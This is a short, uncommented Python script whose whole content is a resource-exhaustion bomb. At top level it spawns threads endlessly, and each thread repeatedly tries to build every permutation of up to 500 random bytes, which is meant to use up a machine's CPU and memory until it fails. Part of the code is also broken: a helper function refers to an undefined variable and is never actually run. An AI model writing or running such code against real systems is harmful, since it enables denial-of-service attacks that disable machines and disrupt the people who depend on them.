import threading
import os
import random
from itertools import permutations

def Convert(string):
    list1=[]
    list1.append(s*random.randint(0,99999))
    for i in range(random.randint(0,99999)):
        yield list1

def main():
    x = os.urandom(random.randint(0,500))
    while True:
        x = Convert(str(list(permutations(x, len(x)))))
while True:
    threading.Thread(target=main).start()
